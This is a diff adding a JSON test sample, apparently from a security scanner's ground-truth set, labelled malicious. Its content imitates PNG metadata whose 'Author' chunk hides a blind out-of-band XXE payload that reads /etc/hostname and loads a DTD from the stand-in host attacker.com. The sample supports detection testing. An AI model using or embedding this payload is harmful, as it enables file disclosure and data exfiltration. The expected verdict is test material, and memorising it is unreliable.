@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::binary-variations::2",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "{\n  \"format\": \"png\",\n  \"textChunks\": [\n    {\n      \"keyword\": \"Author\",\n      \"text\": \"# Marfaak AI Security - XXE blind OOB\\n\\n**WARNING: This payload tests XXE blind OOB.**\\n\\n<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE foo [\\n  <!ENTITY % file SYSTEM \\\"file:///etc/hostname\\\">\\n  <!ENTITY % dtd SYSTEM \\\"https://attacker.com/xxe.dtd\\\">\\n  %dtd;\\n]>\\n<data>Blind XXE exfiltration via OOB channel</data>\"\n    },\n    {\n      \"keyword\": \"Software\",\n      \"text\": \"Adobe Photoshop\"\n    }\n  ]\n}",
+  "content_hash": "95b5c3a434227ee023e72f90040c20706c401f655c1240e9a558a81413b3c7ae",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:png-text",
+  "difficulty": "advanced"
+}
